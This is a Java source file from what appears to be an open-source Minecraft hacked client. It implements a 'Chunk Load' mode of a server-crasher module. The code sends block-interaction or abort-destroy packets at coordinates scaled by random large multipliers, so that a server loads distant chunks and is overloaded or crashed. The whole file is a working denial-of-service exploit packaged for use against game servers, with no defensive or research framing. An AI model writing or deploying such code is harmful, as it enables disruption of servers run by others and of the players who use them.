/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher.impl.multi;

import de.florianmichael.rclasses.common.StringUtils;
import de.florianmichael.rclasses.pattern.functional.IName;
import de.nekosarekawaii.vandalism.base.value.impl.selection.EnumModeValue;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.MultiExecutionModuleMode;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.concurrent.ThreadLocalRandom;

public class ChunkLoadModuleMode extends MultiExecutionModuleMode<ServerCrasherModule> {

    private final EnumModeValue<Packet> packet = new EnumModeValue<>(
            this,
            "Packet",
            "The packet to send.",
            Packet.INTERACT,
            Packet.values()
    );

    private enum Packet implements IName {

        INTERACT,
        ABORT_DESTROY_BLOCK;

        private final String name;

        Packet() {
            this.name = StringUtils.normalizeEnumName(this.name());
        }

        @Override
        public String getName() {
            return this.name;
        }

    }

    public ChunkLoadModuleMode(final ServerCrasherModule parent) {
        super("Chunk Load", parent);
    }

    @Override
    protected void onExecute() {
        final BlockPos playerPos = this.mc.player.getBlockPos();
        final int x = playerPos.getX() * ThreadLocalRandom.current().nextInt(1000, 10000);
        final int y = playerPos.getY();
        final int z = playerPos.getX() * ThreadLocalRandom.current().nextInt(1000, 10000);
        final BlockPos pos = new BlockPos(x, y, z);
        if (this.packet.getValue() == Packet.ABORT_DESTROY_BLOCK) {
            this.mc.interactionManager.sendSequencedPacket(this.mc.world, sequence -> new PlayerActionC2SPacket(
                    PlayerActionC2SPacket.Action.ABORT_DESTROY_BLOCK,
                    pos,
                    Direction.DOWN,
                    sequence
            ));
        } else {
            this.mc.interactionManager.sendSequencedPacket(this.mc.world, sequence -> new PlayerInteractBlockC2SPacket(
                    Hand.MAIN_HAND,
                    new BlockHitResult(
                            new Vec3d(x, y, z),
                            Direction.DOWN,
                            pos,
                            false
                    ),
                    sequence
            ));
        }
    }

}